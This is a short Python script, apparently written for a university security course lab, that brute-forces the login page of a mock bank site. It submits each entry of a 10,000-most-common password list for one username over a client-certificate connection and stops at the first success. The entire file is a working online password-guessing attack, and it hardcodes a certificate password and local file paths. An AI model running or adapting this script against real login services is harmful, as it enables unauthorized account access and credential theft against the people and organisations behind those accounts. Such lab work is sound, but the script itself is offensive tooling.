from requests_pkcs12 import post

base_url = 'https://quoccaid.quoccabank.com/login'
p12_path = '/Users/bryanle/Downloads/z5361001.p12'
p12_password = 'Qs3/Keg5W3D/kSJJfp9ltw=='

with open('/Users/bryanle/Downloads/10k-most-common.txt', 'r') as file:
    passwords = file.read().splitlines()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'https://quoccaid.quoccabank.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://quoccaid.quoccabank.com/login',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
}
count=1
for password in passwords:
    data = {
        'user': 'melon',
        'password': password,
    }
    response = post(
        base_url,
        headers=headers,
        data=data,
        pkcs12_filename=p12_path,
        pkcs12_password=p12_password
    )
    if response.status_code == 200:
        print(f"{count} - Success with password: {password} !!!")
        break
    elif response.status_code == 403:
        print(f"{count} - Failed with password: {password} ")
    else:
        print(f"{count} - Failed with error: {response.status_code}")
        break
    count += 1